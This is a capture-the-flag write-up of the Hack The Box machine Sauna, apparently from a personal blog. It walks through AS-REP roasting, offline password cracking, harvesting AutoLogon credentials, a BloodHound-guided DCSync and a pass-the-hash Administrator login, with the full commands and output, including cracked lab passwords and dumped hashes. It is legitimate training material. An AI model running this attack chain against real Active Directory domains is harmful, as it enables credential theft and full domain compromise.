---
layaout: post
title: Sauna Write Up HTB
image: assets/saune/sauna.png
date: 28-01-2025
categories: [Write ups]
tag: [Active Directory, Osint, Bloodhound, As-Rep]
---
![img-description](/assets/saune/Sauna.png)

**Sauna** is an easy-level machine that challenges you to perform internal network penetration testing within an Active Directory environment. It involves techniques such as website OSINT for gathering potential usernames, BloodHound enumeration for mapping attack paths, and executing DCSync attacks to extract password hashes.

# ENUMERATION
---
## Nmap scanning
---
````bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.175 -sCV -vvv

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-28 22:55:32Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35558/tcp): CLEAN (Timeout)
|   Check 2 (port 14401/tcp): CLEAN (Timeout)
|   Check 3 (port 57297/udp): CLEAN (Timeout)
|   Check 4 (port 62384/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-01-28T22:56:21
|_  start_date: N/A
````

After analyzing the Nmap scan, we can deduce that we are dealing with an Active Directory environment. The presence of a web server on port 80 raises suspicion, as it is quite uncommon and generally inadvisable to have a publicly accessible web service within a corporate environment. However, before enumerating the web server, we will proceed to test the SMB service.

## Enumerating SMB as anonymous and guest.
---
````bash
❯ crackmapexec smb 10.10.10.175 -u '' -p ''
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\: 
❯ crackmapexec smb 10.10.10.175 -u 'guest' -p 'guest'
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\guest:guest STATUS_LOGON_FAILURE 
````

Unfortunately, we do not have any access to the SMB service as either an anonymous or guest user. Therefore, we proceed to enumerate the web server in search of information that might help us identify a potential attack vector.

## Enumerating of the web service at port 80
---
While enumerating the web server, we discovered potential employee names from the company. However, we are unsure of the naming convention used within the Active Directory. As a result, we have created our own custom wordlist and will test it to determine if any of the entries correspond to valid usernames.
![Usersweb](/assets/saune/usernames.png)

````bash
File: users.txt
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ fergus smith
   2   │ shaun coins
   3   │ sophie driver
   4   │ hugo bear
   5   │ bowie taylor
   6   │ steven kerb
````
---
## Making our wordlist to check for kerberos pre-authentication vulnerability
---
````bash
./username-anarchy --input-file /home/whare/hackthebox/maquinas/saune/users.txt  --select-format first,flast,first.last,firstl > test_users.txt
cat test_users.txt
File: test_users.txt
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ fergus
   2   │ fergus.smith
   3   │ ferguss
   4   │ fsmith
   5   │ shaun
   6   │ shaun.coins
   7   │ shaunc
   8   │ scoins
   9   │ sophie
  10   │ sophie.driver
  11   │ sophied
  12   │ sdriver
  13   │ hugo
  14   │ hugo.bear
  15   │ hugob
  16   │ hbear
  17   │ bowie
  18   │ bowie.taylor
  19   │ bowiet
  20   │ btaylor
  21   │ steven
  22   │ steven.kerb
  23   │ stevenk
  24   │ skerb
````

## AS-REP ATTACK

Using the previously created wordlist, we will utilize the `GetNPUsers.py`. Additionally, this will allow us to perform an AS-REP attack.

An AS-REP attack exploits accounts in Active Directory that have the "Do not require Kerberos preauthentication" option enabled. When this setting is active, it allows an attacker to request an encrypted Ticket Granting Ticket (TGT) directly from the Key Distribution Center (KDC). The encrypted TGT can then be brute-forced offline to retrieve the user's plaintext password.
````bash
GetNPUsers.py -no-pass -usersfile test_users.txt EGOTISTICAL-BANK.local/

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/whare/hackthebox/scripts/cositas/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos databa
se)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3708af00938c26b656cf302185329388$492ef8d2268cc851566269e07d569cde905999c89c5bf96ac130b0bb1ca3fc2b92a8ae718eee3adb5cfc49a4f60c19a4991120804262e4331d55380998b01a42e666de338b4d0210bbe316eaa9bde84f116437dcd977e79921df060e0fd5dfe66872c12ebe8a3205be9ab0aacc7e362d57f9d7d192953110e212357d7ed988b8b3ae4272210cafd2c07aad52512ce9f94226677792982d32242abb431011b98cdb66be0381db95221896e490bf74c95e1cee43fa45171524393dbeb8250701c568145644ae652ef97a1fe8960c49484a216f49124496c2fe02843c8716ddd2fc7893c31554015bb97ac9503e2dc53976ffc67efa2ae309061b2477b11109b326
````
## Password cracking
---
We successfully identified a valid user that does not require Kerberos preauthentication. As a result, we were able to obtain the TGT, which we will proceed to decrypt using John the Ripper and our most common wordlist to gain access.

It is important to clarify that, on its own, obtaining a TGT and identifying a user without preauthentication is not necessarily a vulnerability. However, if we combine this with a weak password, it opens the possibility of successfully cracking it using John and a basic dictionary.

````bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:00:10 DONE (2025-01-28 18:03) 0.09891g/s 1042Kp/s 1042Kc/s 1042KC/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
````

# FOOTHOLD
---
During our previous enumeration with Nmap, we noticed that the WinRM port was open:

````bash
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
````

We will use the credentials we obtained to attempt to log in via WinRM, allowing us to begin our privilege escalation process.

````powershell
evil-winrm -u 'fsmith' -p 'Thestrokes23' -i 10.10.10.175
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Desktop ls
Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/28/2025   2:54 PM             34 user.txt
````

# AUTHENTICATED ENUMERATION
---
We will transfer WinPEAS to the machine to see if we can find any interesting information before resorting to more complex methods.

````powershell
*Evil-WinRM* PS C:\Users\FSmith\downloads> upload winPEASx64.exe
                                        
Info: Uploading /home/whare/hackthebox/maquinas/saune/winPEASx64.exe to C:\Users\FSmith\downloads\winPEASx64.exe
                                        
Data: 13521576 bytes of 13521576 bytes copied
                                        
Info: Upload successful!
````
Using WinPEAS in a large environment, such as an Active Directory, is typically quite tedious due to the sheer volume of information it outputs. However, in this case, we were fortunate enough to find valid credentials for the `svc_loanmanager` service within just a few lines.

The `svc_loanmanager` service is typically responsible for managing and automating tasks related to loan processing within the organization. It may handle various functions such as loan application processing, approval workflows, and maintaining data integrity for loan-related transactions. Access to such a service can potentially provide elevated privileges or access to sensitive data, making it a valuable target for further exploitation.

````powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
````

# PRIVILEGE ESCALATION
---
We logged into the new user account using Evil-WinRM, and after running WinPEAS again, we did not find anything of particular interest.

````powershell
evil-winrm -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' -i 10.10.10.175
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 
````

## Blooudhound enumeration
---
Therefore, we will resort to more advanced techniques. However, once you begin to understand and properly use BloodHound, the doors to privilege escalation open up wide!

**BloodHound**:  
BloodHound is a tool for Active Directory auditing that helps map trust relationships, permissions, and privilege escalation paths within a domain. It visually identifies attack vectors by showing how an attacker could escalate privileges or move laterally within a network.

**SharpHound**:  
SharpHound is the data collection tool used by BloodHound. It scans the Active Directory environment to gather information about users, groups, permissions, and trust relationships. The data collected is then analyzed by BloodHound.

**Why we use SharpHound**:  
We use **SharpHound** because it performs a more thorough scan of the domain from within the network. It reveals detailed relationships and permissions that may not be accessible remotely, providing critical information for privilege escalation.

I like to think that when I use these tools, I'm using the photo beacon from _Outer Wilds_ ![img-description](/assets/saune/outerwilds.gif)


````powershell
*Evil-WinRM* PS C:\Users\svc_loanmgr\documents> ./SharpHound.exe
2025-01-28T18:02:02.9369367-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
*Evil-WinRM* PS C:\Users\svc_loanmgr\documents> ls


    Directory: C:\Users\svc_loanmgr\documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/28/2025   6:02 PM          25079 20250128180204_BloodHound.zip
-a----        1/28/2025   5:45 PM        1557504 SharpHound.exe
-a----        1/28/2025   6:02 PM           1308 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
````
After running SharpHound, we will transfer the data to our local machine and run the Neo4j console.

**Neo4j console** is a graph database management system used by BloodHound to visualize and query the collected Active Directory data. It helps represent the relationships and trust paths in a graph format, making it easier to identify attack vectors and escalation paths.

**DISCLAIMER**: If you are using **BloodHound** installed from Kali's APT repository, you will need to run **SharpHound v1.1.0**. Otherwise, your data will not load properly.

Now we can open our **bloodhound** to upload our recolected data
![img-description](/assets/saune/upload.png){: .normal }

After loading the data collected by SharpHound and marking that we have pwned the `SVC_LOANMGR` account, we can select the "Shortest paths to Domain Admins" option in the analysis.
![img-description](/assets/saune/dcsync.png)
A **DCSync attack** is a method used to simulate the behavior of a Domain Controller (DC) in order to retrieve password hashes of domain accounts from Active Directory. This attack exploits the replication protocol used by domain controllers to synchronize directory data. By performing a DCSync attack, an attacker can request the password hashes (or even clear-text passwords, if applicable) for specific accounts without needing direct access to the DC.

To execute this attack, you can use **Impacket’s `secretsdump.py`** script. This tool allows you to dump the password hash of any arbitrary principal in the domain:

We can literally dump any credentials of the domain
````bash
/secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:4eee6e4833a67da7595d97c5c265073e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:ae47bb5ddc19539726ca58ca427740af7cf19ef5824a9b72013c443f548086a2
SAUNA$:aes128-cts-hmac-sha1-96:05da8a407a545e7f813fb591aa611373
SAUNA$:des-cbc-md5:9e7502830ebad576
[*] Cleaning up... 
````

But we will only need the credentials of the DC's Administrator.

````bash
./secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 
````

After that, we simply copy the credentials and log in using Evil-WinRM and GG WP.

````powershell
❯ evil-winrm -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175

Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/28/2025   2:54 PM             34 root.txt
````
![netrunner](/assets/images/netrunner.gif)